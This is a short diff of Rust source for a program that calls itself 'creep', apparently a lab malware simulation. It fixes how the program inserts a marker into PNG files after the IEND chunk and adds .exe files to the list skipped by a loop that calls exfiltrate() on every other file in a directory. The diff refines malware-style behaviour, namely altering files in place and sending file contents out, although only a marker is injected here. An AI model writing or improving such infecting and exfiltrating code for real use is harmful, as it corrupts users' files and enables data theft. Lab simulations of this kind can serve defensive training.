@@ -99,13 +99,15 @@ fn infect_binary(path: &Path) -> bool {
     match ext.as_str() {
         "png" => {
             if let Some(pos) = data.windows(4).position(|w| w == b"IEND") {
-                let split = pos + 12;
-                let mut new = data[..split].to_vec();
-                new.extend_from_slice(marker.as_bytes());
-                new.extend_from_slice(&data[split..]);
-                fs::write(path, new).ok();
-                println!("[creep] infected: {} (appended marker after IEND)", name);
-                return true;
+                let split = pos + 8;
+                if split <= data.len() {
+                    let mut new = data[..split].to_vec();
+                    new.extend_from_slice(marker.as_bytes());
+                    new.extend_from_slice(&data[split..]);
+                    fs::write(path, new).ok();
+                    println!("[creep] infected: {} (appended marker after IEND)", name);
+                    return true;
+                }
             }
         }
         "jpg" | "jpeg" => {
@@ -179,7 +181,7 @@ fn main() {
         let path = entry.path();
         if !path.is_file() { continue; }
         let name = path.file_name().unwrap().to_string_lossy().to_string();
-        if name == SELF_SOURCE || name == "setup_lab.py" || name.starts_with("README") { continue; }
+        if name == SELF_SOURCE || name == "setup_lab.py" || name.starts_with("README") || name.ends_with(".exe") { continue; }
         exfiltrate(&path);
         read_count += 1;
     }
